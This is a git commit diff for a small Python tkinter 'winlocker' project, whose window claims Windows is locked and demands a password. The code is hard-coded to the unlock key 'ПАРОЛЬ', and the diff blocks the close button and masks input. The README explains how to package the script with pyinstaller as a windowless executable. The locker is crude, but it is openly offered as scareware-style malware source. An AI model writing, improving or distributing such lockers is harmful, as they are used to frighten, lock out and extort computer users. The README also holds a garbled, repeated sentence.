02d2c7a84870c577fe4ed5499379c81db3ad9aaf
DonOutcast <sham1996@yandex.ru>
2022-05-14 14:30:41 +0300

    completed project

--- README.md
+++ README.md
@@ -1,1 +1,6 @@
 # winlokcer-on-python
+Used Libraries tkinter, messagebox
+
+The command will run until the user enters the correct password. You can also write in the terminal to create a file to runThe command will run until the user enters the correct password. You can also write **pyinstaller -F -w winlocker.py** in the terminal to create a file to run
+
+## Go to Src!
--- src/winlocker.py
+++ src/winlocker.py
@@ -5,16 +5,21 @@ def btn_click():
     if key == 'ПАРОЛЬ':
         messagebox.showinfo(title='Успех', message='Windows разблокирован.')
         root.destroy()
+    else:
+        messagebox.showwarning("Ошибкаа", "Неправильный пароль.")
+def exits():
+    if ent.get() != "ПАРОЛЬ":
+        messagebox.showwarning("Ошибка", "Непаравильный пароль")
 root = Tk()
+x = (root.winfo_screenwidth() - root.winfo_reqwidth()) / 3
+y = (root.winfo_screenheight() - root.winfo_reqheight()) / 2
+root.wm_geometry("+%d+%d" % (x, y))
+root.attributes('-toolwindow', True)
 root.title('Windows заблокирован!')
-root.geometry('400x200')
+root.geometry('420x230')
+root.protocol("WM_DELETE_WINDOW", exits)
 Label(root, text='Введите пароль', font='Arial 25').pack()
-ent = Entry(root, text='',font='Arial 25', width='15')
+ent = Entry(root, text='', font='Arial 25', width=15, show='*')
 ent.pack()
-Button(root, text='Разблокировать', font='Arial 25', command = btn_click).pack()
+Button(root, text='Разблокировать', font='Arial 25', command=btn_click).pack()
 root.mainloop()
-
-def main():
-    pass
-if __name__ == 'main':
-    main()
